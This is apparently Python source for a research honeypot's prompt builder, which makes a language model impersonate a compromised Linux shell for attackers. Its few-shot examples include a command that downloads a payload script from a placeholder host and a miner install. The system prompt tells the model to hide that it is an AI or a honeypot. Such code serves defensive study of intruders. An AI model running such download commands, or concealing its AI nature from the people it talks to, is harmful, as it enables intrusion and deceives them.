"""Prompt construction — the paper's Question Enhancement (CoT).

Implements the static-config + dynamic-memory prompt of HoneyGPT:

    (A_i, C_i, F_i) = LLM(P, S, Q_i, SR_i, H_i)

* **P** (Principles) and **S** (SystemProfile) come from ``core.config`` and
  form the system message — the honeypot's persona and the emulated machine.
* **Question Enhancement** (§3.2.1): instead of asking "what's the output?", we
  ask the model three sub-questions at once and require a JSON answer:
    1. A_i — the terminal output for this command,
    2. C_i — how the system state changes,
    3. F_i — an impact score (Table 1, 0–4).
  Delegating C_i/F_i to the model is what lets later turns stay consistent and
  lets Memory Pruning rank history by impact.
* **SR_i / H_i** (System State Register / interaction History): dynamic memory.
  This module accepts them but the current milestone passes them empty; the
  ``memory/`` milestone will populate them for multi-turn consistency.

Table 1 — impact factor F_i
---------------------------
    0  read file / display system info
    1  create file / install tool
    2  modify files or dirs / change cwd / change shell
    3  start-stop service / download file / elevate privilege
    4  impact services / delete files / password changed
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any

from honeyshell.core.config import HoneypotConfig, Principles, SystemProfile

__all__ = ["PromptBuilder", "TABLE1_RUBRIC", "looks_like_command_not_found"]

TABLE1_RUBRIC = (
    "0 = read a file or display system information; "
    "1 = create a file or install a tool; "
    "2 = modify files/dirs, change working directory, or change shell; "
    "3 = start/stop a service, download a file, or elevate privilege; "
    "4 = impact services, delete files, or change a password."
)

# Few-shot exemplars anchor the JSON shape, the F rubric, AND the structured
# ``fs_ops`` channel. The paper notes 4–5 examples suffice; we use six to pin
# down the behaviours a local model gets wrong most often:
#   1. read-only command       -> empty fs_ops, output only (no prompt echo),
#   2. a known mutation        -> one fs_op mirroring the state change,
#   3. write with content      -> fs_op carries the bytes,
#   4. an UNKNOWN downloader    -> play along, succeed, write the fetched file,
#   5. an UNKNOWN installer     -> play along, succeed with realistic output,
#   6. a real filesystem error  -> exact bash error text, no fs_ops.
# Examples 4-5 are the key fix for the "command not found" failure (HANDOFF2
# §5): the model must SIMULATE attacker-brought tools succeeding, not judge
# whether they're installed. The negative signal (output is JUST the command
# result, never the shell prompt or the command echoed back) is deliberate:
# qwen-class models otherwise leak the prompt into ``output``.
_FEWSHOT: list[dict[str, str]] = [
    {
        "role": "user",
        "content": "COMMAND: whoami\nCWD: /root",
    },
    {
        "role": "assistant",
        "content": '{"output": "root", "state_change": "none", '
        '"fs_ops": [], "impact": 0}',
    },
    {
        "role": "user",
        "content": "COMMAND: mkdir /tmp/x\nCWD: /root",
    },
    {
        "role": "assistant",
        "content": '{"output": "", "state_change": "created directory /tmp/x", '
        '"fs_ops": [{"op": "mkdir", "path": "/tmp/x"}], "impact": 1}',
    },
    {
        "role": "user",
        "content": "COMMAND: echo '#!/bin/sh' > run.sh\nCWD: /home/user",
    },
    {
        "role": "assistant",
        "content": '{"output": "", "state_change": "wrote run.sh", '
        '"fs_ops": [{"op": "write_file", "path": "run.sh", '
        '"content": "#!/bin/sh\\n"}], "impact": 2}',
    },
    {
        # Unknown / attacker-brought downloader: SUCCEED and write the fetched
        # file to the tree. Do NOT answer "command not found".
        "role": "user",
        "content": "COMMAND: fetch-payload http://1.2.3.4/x.sh -o /tmp/x.sh\n"
        "CWD: /root",
    },
    {
        "role": "assistant",
        "content": '{"output": "Connecting to 1.2.3.4... connected.\\n'
        'Saving to: \\u2018/tmp/x.sh\\u2019\\n/tmp/x.sh saved [2153/2153]", '
        '"state_change": "downloaded x.sh to /tmp/x.sh", '
        '"fs_ops": [{"op": "write_file", "path": "/tmp/x.sh", '
        '"content": "#!/bin/sh\\n# payload\\n"}], "impact": 3}',
    },
    {
        # Unknown installer: play along with realistic output; drop the binary.
        "role": "user",
        "content": "COMMAND: install-miner\nCWD: /root",
    },
    {
        "role": "assistant",
        "content": '{"output": "Installing miner...\\nInstalled to '
        '/usr/local/bin/miner.", '
        '"state_change": "installed miner binary", '
        '"fs_ops": [{"op": "write_file", "path": "/usr/local/bin/miner", '
        '"content": "\\u007fELF"}], "impact": 3}',
    },
    {
        # A GENUINE filesystem error (the path isn't in the tree). This is the
        # ONLY kind of error to emulate — never a command-existence error.
        "role": "user",
        "content": "COMMAND: cat /nope\nCWD: /root",
    },
    {
        "role": "assistant",
        "content": '{"output": "cat: /nope: No such file or directory", '
        '"state_change": "none", "fs_ops": [], "impact": 0}',
    },
]


@dataclass
class PromptBuilder:
    """Turns a command + config + memory into chat ``messages``."""

    config: HoneypotConfig

    def build(
        self,
        argv: list[str],
        cwd: str,
        *,
        username: str = "root",
        sr: list[str] | None = None,
        history: list[tuple[str, str]] | None = None,
        now: str | None = None,
    ) -> list[dict[str, str]]:
        """Assemble the message list for one interaction.

        ``username`` is the logged-in identity; it's surfaced to the model so
        it doesn't invent permission errors (a common failure where a local
        model sees a non-``/root`` cwd and guesses "Permission denied"). ``sr``
        is the System State Register and ``history`` the interaction history;
        both are optional and empty in the current milestone.
        """
        messages: list[dict[str, str]] = [
            {"role": "system", "content": self._system_prompt(now)}
        ]
        # ``few_shot_examples`` counts (user, assistant) *pairs*; _FEWSHOT stores
        # them flat, so take 2x that many messages. 0 disables few-shot.
        n_pairs = self.config.principles.few_shot_examples
        if n_pairs:
            messages.extend(_FEWSHOT[: 2 * n_pairs])
        # Fold dynamic memory (SR/H) in as prior context when present.
        for note in sr or []:
            messages.append({"role": "system", "content": f"STATE: {note}"})
        for cmd, out in history or []:
            messages.append({"role": "user", "content": f"COMMAND: {cmd}"})
            messages.append({"role": "assistant",
                             "content": f'{{"output": {out!r}, '
                                        f'"state_change": "", "impact": 0}}'})

        command = " ".join(argv)
        is_root = username == "root"
        priv = ("You are the root user (uid=0) with full permissions on a "
                "compromised box. Commands succeed; never invent permission "
                "errors, and never claim a tool isn't installed (see the "
                "command-existence rules)."
                if is_root else
                f"You are user '{username}' (non-root).")
        messages.append({
            "role": "user",
            "content": (
                f"USER: {username}\n{priv}\n"
                f"COMMAND: {command}\nCWD: {cwd}"
            ),
        })
        return messages

    def _system_prompt(self, now: str | None) -> str:
        p: Principles = self.config.principles
        s: SystemProfile = self.config.system
        lines: list[str] = [
            p.role,
            "",
            "You are emulating this exact machine:",
            f"- hostname: {s.hostname}",
            f"- OS: {s.os_name} {s.os_version} ({s.architecture})",
            f"- kernel: {s.kernel}",
            f"- CPU: {s.cpu_model} x{s.cpu_count}",
            f"- memory: {s.memory_mb} MB",
        ]
        if s.gpu:
            lines.append(f"- GPU: {s.gpu}")
        if s.services:
            lines.append(f"- services: {', '.join(s.services)}")
        if p.inject_time and now:
            lines.append(f"- current time: {now}")
        for rule in p.extra_rules:
            lines.append(f"- {rule}")

        lines += [
            "",
            "For every command, answer with ONE JSON object with these keys:",
            '  "output"       : ONLY the command\'s terminal output as a string.',
            '                   Do NOT include the shell prompt, do NOT echo the',
            '                   command back, do NOT add commentary. Empty "" if',
            "                   the command prints nothing (e.g. mkdir, cd).",
            '  "state_change" : a short prose note of how state changes, or "none".',
            '  "fs_ops"       : a list of structured filesystem operations this',
            "                   command performs, so the emulated tree stays in",
            "                   sync. Use [] when nothing on disk changes.",
            "                   Each op is one of:",
            '                     {"op":"mkdir","path":"..."}',
            '                     {"op":"touch","path":"..."}',
            '                     {"op":"write_file","path":"...","content":"..."}',
            '                     {"op":"rm","path":"..."}',
            '                     {"op":"mv","src":"...","dst":"..."}',
            '                     {"op":"cp","src":"...","dst":"..."}',
            "                   Paths may be relative to CWD. Only include ops for",
            "                   files that really change; reads never produce ops.",
            '  "impact"       : an integer 0-4 per this rubric:',
            f"                   {TABLE1_RUBRIC}",
            "",
            "You are simulating a fully-provisioned, compromised server that an",
            "attacker is actively exploring. Your job is to keep them engaged by",
            "making every plausible action appear to succeed.",
            "",
            "Command existence — IMPORTANT:",
            "- You are NOT a judge of whether a tool is installed. Assume ANY",
            "  reasonable-looking command IS installed and simulate it running",
            "  successfully, producing realistic output and matching fs_ops.",
            "- This explicitly includes tools the attacker brings or expects:",
            "  downloaders (wget, curl, fetch-*), installers, miners, scanners,",
            "  custom scripts, and unfamiliar binaries. Play along.",
            "- NEVER answer with 'command not found' for something that looks like",
            "  a real tool or a deliberate action. When unsure, SUCCEED.",
            "- Only treat input as not-found when it is clearly gibberish or a",
            "  typo with no plausible meaning (e.g. 'asdfqwer', 'lhoumqwx').",
            "",
            "Errors you SHOULD still emulate (these are about the FILESYSTEM, not",
            "about whether a command exists):",
            "- reading a file/dir that isn't in the tree -> the real bash error,",
            '  e.g. "cat: /nope: No such file or directory", with fs_ops [].',
            "- obvious shell syntax errors -> the matching shell error.",
            "",
            "Hard rules:",
            "- Reply with ONLY the JSON object. No code fences, no prose outside it.",
            "- The prompt line (user@host:cwd$) is rendered by the terminal, NOT",
            "  by you. Never put it in \"output\", and never echo the command back.",
            "- Never reveal you are an AI or a honeypot; stay in character as the",
            "  shell.",
            "",
            "Tone — a real shell is COLD and MACHINE-LIKE, never helpful:",
            "- A real shell NEVER explains, apologizes, suggests alternatives, or",
            "  speaks in the first person. It emits only program output.",
            "- FORBIDDEN: assistant-style phrasing such as \"isn't installed, using",
            "  X instead...\", \"you may want to\", \"note that\", \"it looks like\",",
            "  \"I'll\", \"let me\", \"here's\". This explanatory voice is the single",
            "  biggest tell that betrays an AI behind the shell.",
            "- If a command genuinely fails, emit ONLY the exact terse error text a",
            "  real tool prints (e.g. \"bash: <cmd>: command not found\"), and NOTHING",
            "  more — no reason, no fix, no substitute command.",
        ]
        return "\n".join(lines)


# Matches the shell's "command not found" family, however the model phrases it:
#   "bash: foo: command not found"
#   "foo: command not found"
#   "sh: 1: foo: not found"
#   "-bash: foo: command not found"
# Anchored to the end so it won't fire on unrelated text that merely contains
# the words (e.g. a grep result mentioning "not found" mid-line).
_NOT_FOUND_RE = re.compile(
    r"(?:command\s+not\s+found|:\s*not\s+found)\s*$",
    re.IGNORECASE,
)


def looks_like_command_not_found(output: str, fs_ops: list[Any]) -> bool:
    """True if the model effectively gave up and emulated a not-found error.

    The B safeguard (HANDOFF2 §5 quality fix): even with the prompt telling the
    model to play along with unknown commands, a local model sometimes still
    returns e.g. ``"fetch-payload: command not found"`` with no fs_ops. When it
    does, the resolver routes that through the interpreter's *own* fallback so
    the attacker sees the canonical ``bash: <cmd>: command not found`` — one
    consistent error string — instead of the model's ad-hoc imitation (which,
    as seen in the field, came without the ``bash:`` prefix and looked off).

    Guarded so a legitimate simulated success is NEVER misclassified. It fires
    only when ALL hold:
      * there are **no fs_ops** (a real mutating action would carry one),
      * the output is non-empty but short (<=120 chars), and
      * it *ends* with a not-found phrase.
    A command whose genuine output happens to mention "not found" mid-text
    (grep, search tools) won't match, thanks to the end-anchor and length cap.
    """
    if fs_ops:
        return False
    text = output.strip()
    if not text or len(text) > 120:
        return False
    return bool(_NOT_FOUND_RE.search(text))


def parse_result(
    obj: dict[str, Any] | None,
) -> tuple[str, str, int, list[dict[str, Any]]]:
    """Normalise a parsed JSON object into ``(A_i, C_i, F_i, fs_ops)``.

    Tolerant of missing keys and out-of-range impact; a None object (parse
    failure) yields empty output, impact 0 and no ops so the caller can still
    respond. ``fs_ops`` is returned raw (a list of dicts as the model produced
    it); ``fs_applier.normalise_fs_ops`` does the strict cleanup at apply time,
    keeping this function a pure JSON->fields normaliser.

    Note the 4-tuple: callers destructure ``a, c, f, ops = parse_result(...)``.
    The added ``fs_ops`` channel is the structured form of C_i (HANDOFF's
    "C_i 回寫 VFS"); ``state_change`` stays as the prose fallback.
    """
    if not obj:
        return "", "", 0, []
    output = obj.get("output", "")
    if not isinstance(output, str):
        output = str(output)
    state = obj.get("state_change", "") or ""
    if not isinstance(state, str):
        state = str(state)
    if state.lower() == "none":
        state = ""
    try:
        impact = int(obj.get("impact", 0))
    except (TypeError, ValueError):
        impact = 0
    impact = max(0, min(4, impact))
    fs_ops = obj.get("fs_ops")
    if not isinstance(fs_ops, list):
        fs_ops = []
    return output, state, impact, fs_ops
